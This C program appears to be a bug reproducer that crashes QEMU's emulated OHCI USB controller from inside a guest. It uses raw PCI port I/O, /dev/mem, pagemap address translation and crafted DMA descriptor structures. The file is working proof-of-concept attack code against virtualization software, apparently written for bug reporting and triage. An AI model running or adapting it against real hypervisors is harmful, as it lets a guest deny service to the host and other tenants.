#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/io.h>
#include <time.h>

uint8_t *mmio_mem;
uint8_t *config_mem;
uint8_t *devmem_mem;

void die(const char *msg) {
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr) {
    return *((uint32_t *)(mmio_mem + addr));
}

void config_write(uint32_t addr, uint32_t value) {
    *((uint32_t *)(config_mem + addr)) = value;
}

uint32_t config_read(uint32_t addr) {
    return *((uint32_t *)(config_mem + addr));
}

#define PAGE_SHIFT  12
#define PAGE_SIZE   (1 << PAGE_SHIFT)
#define PFN_PRESENT (1ull << 63)
#define PFN_PFN     ((1ull << 55) - 1)
int pagemap_fd;

uint32_t page_offset(uint32_t addr) {
    return addr & ((1 << PAGE_SHIFT) - 1);
}

uint64_t gva_to_gfn(void *addr) {
    uint64_t pme, gfn;
    uint64_t offset;
    offset = ((uint64_t)addr >> 12) << 3;
    lseek(pagemap_fd, offset, SEEK_SET);
    read(pagemap_fd, &pme, 8);
    if (!(pme & PFN_PRESENT))
        return -1;
    gfn = pme & PFN_PFN;
    printf("[+] gva_to_gfn 0x%lx -> 0x%lx\n", pme, gfn);
    return gfn;
}

uint64_t gva_to_gpa(void *addr) {
    uint64_t gfn = gva_to_gfn(addr);
    if (gfn == -1)
        die("[-] Physical page not present.\n");
    return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
}

void *calloc_256aligned(size_t size) {
    void *ptr_virt = mmap(0, size + 256, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (ptr_virt == MAP_FAILED)
        die("[-] Mmap 256aligned buffer failed.\n");
    mlock(ptr_virt, size + 256);
    uint64_t ptr_phys = gva_to_gpa(ptr_virt);
    uint64_t __ptr_phys = (ptr_phys + 0xff) & (~(uint64_t)0xff);
    return (void *)((uint64_t)ptr_virt + (__ptr_phys - ptr_phys));
}

//
// OHCI specific structs
//
typedef struct ohci_hcca {
    uint32_t intr[32];
    uint16_t frame, pad;
    uint32_t done;
} ohci_hcca;

typedef struct ohci_ed {
    uint32_t flags;
    uint32_t tail;
    uint32_t head;
    uint32_t next;
} ohci_ed;

typedef struct ohci_td {
    uint32_t flags;
    uint32_t cbp;
    uint32_t next;
    uint32_t be;
} ohci_td;

typedef struct ohci_iso_td {
    uint32_t flags;
    uint32_t bp;
    uint32_t next;
    uint32_t be;
    uint16_t offset[8];
} ohci_iso_td;

int main(int argc, char **argv) {
    printf("[+]\n[+] Reproduce ohci-01: abort in ohci_frame_boundary!\n[+]\n");

    // lspci -v and we will get ohci's pci address
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("[-] Open mmio_fd failed.\n");
    printf("[+] Open mmio_fd successful.\n");
    mmio_mem = mmap(0, 0x100, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("[-] Mmap mmio_mem failed.\n");
    printf("[+] Mmap mmio_mem at %p.\n", mmio_mem);

    pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
    if (pagemap_fd < 0)
        die("[-] Open pagemap failed.\n");
    printf("[+] Open pagemap successful.\n");

    int devmem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    devmem_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, devmem_fd, 0);
    if (devmem_mem == MAP_FAILED)
        die("[-] Mmap devmem_mem failed.\n");
    printf("[+] Mmap devmem_mem at %p.\n", devmem_mem);

    // GDB
    // gef config context.nb_lines_backtrace 2
    // b ../hw/usb/hcd-ohci.c:1591
    // b ../hw/usb/hcd-ohci.c:1621
    // b ../hw/ush/hcd-ohci.c:580
 
    // we want to enable the bus master bit to enable DMA
    iopl(3);
    uint32_t command_address;
    uint32_t command_status;
    command_address = 0x80000000 | 0x0000 << 16 | 0x03 << 11 | 0x0 << 8 | 0x04;
    // read
    outl(command_address, 0xcf8);
    command_status = inl(0xcfc);
    printf("[+] ohci PCI_CONFIG.Command = 0x%x\n", (uint16_t)command_status);
    // write
    command_status |= 0x4;
    outl(command_address, 0xcf8);
    outl(command_status, 0xcfc);
    // read
    outl(command_address, 0xcf8);
    command_status = inl(0xcfc);
    printf("[+] ohci PCI_CONFIG.Command = 0x%x\n", (uint16_t)command_status);
    sleep(1);

    // set up dependent buffers
    ohci_hcca *hcca0 = (ohci_hcca *)calloc_256aligned(sizeof(ohci_hcca));
    uint64_t hcca0_phys = gva_to_gpa(hcca0);
    ohci_ed *ed0 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
    uint64_t ed0_phys = gva_to_gpa(ed0);
    ohci_ed *ed1 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
    uint64_t ed1_phys = gva_to_gpa(ed1);
    ohci_ed *ed2 = (ohci_ed *)calloc_256aligned(sizeof(ohci_ed));
    uint64_t ed2_phys = gva_to_gpa(ed2);
    ed0->next = (uint32_t)ed1_phys;
    ed1->flags = 0x25be8080;
    ed1->tail = (uint32_t)ed2_phys;
    hcca0->intr[1] = ed0_phys;
    memset((void *)devmem_mem, 0, sizeof(ohci_iso_td));

    // reset
    mmio_write(0x8/*hccommandstatus*/, 0x1/*OHCI_STATUS_HCR*/);
    // a, set ohci->ctl and enable OHCI_CTL_PLE (0x4)
    mmio_write(0x4/*hccontrol*/, 0x1fd0290e | 0xc0);
    // b, sleep, invoke ohci_frame_boudary and increase ohci->frame by 1
    // c, fill hcca and make sure hcca.intr (ED) is available
    mmio_write(0x18/*hchcca*/, hcca0_phys/*OHCI_CTL_PLE*/);
    mmio_write(0x4/*hccontrol*/, 0x1fd0298e | 0x80);
    sleep(1);
    mmio_write(0x4/*hccontrol*/, 0x1fd0298e | 0xc0);

    printf("[+]\n[+] Reproduce ohci-01: failed!\n[+]\n");

    return 0;
}
